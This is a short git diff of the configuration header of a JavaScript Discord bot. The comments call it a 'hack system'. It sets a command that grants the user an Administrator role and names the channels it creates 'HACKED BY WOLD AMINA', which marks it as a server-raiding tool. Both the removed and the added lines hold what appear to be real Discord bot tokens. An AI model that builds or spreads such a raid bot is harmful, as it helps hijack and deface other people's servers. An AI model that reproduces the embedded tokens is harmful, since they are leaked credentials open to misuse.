@@ -1,6 +1,6 @@
 
 const client = new Discord.Client();
-const Token = 'NjMxODM4Nzc4NDY1NTgzMTM4.XZ8rvg.wreAHMxz8RpRXECXRdvwGZydQQg' //حط توكن بوتك هنا // your bot token
+const Token = 'NjMwNDU5MTQ4OTg2ODc1OTM1.Xn03PQ.B1dDd6SmuxOiogt0gkD8Cb8_BME' //حط توكن بوتك هنا // your bot token
 const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
 const teext = "HACKED BY WOLD AMINA" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
